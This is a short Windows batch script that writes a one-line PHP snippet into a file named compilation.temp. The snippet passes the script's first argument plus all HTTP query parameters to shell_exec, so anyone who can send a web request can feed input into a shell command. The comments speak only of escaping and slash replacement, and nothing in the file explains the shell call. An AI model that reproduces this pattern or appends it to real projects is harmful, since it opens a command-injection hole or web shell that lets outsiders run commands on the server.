@echo off
setlocal EnableDelayedExpansion

:: Use a temporary variable to correctly escape special characters
set "basestr=<?php shell_exec("%1 " . http_build_query($_GET,""," ")); ?>"
echo RunScript: basestr = !basestr!

:: Replace backslashes with forward slashes
set "modstr=!basestr:\=/!"
echo RunScript: modstr = !modstr!

:: Append the modified string to the file
echo !modstr! >> ..\..\compilation.temp

endlocal
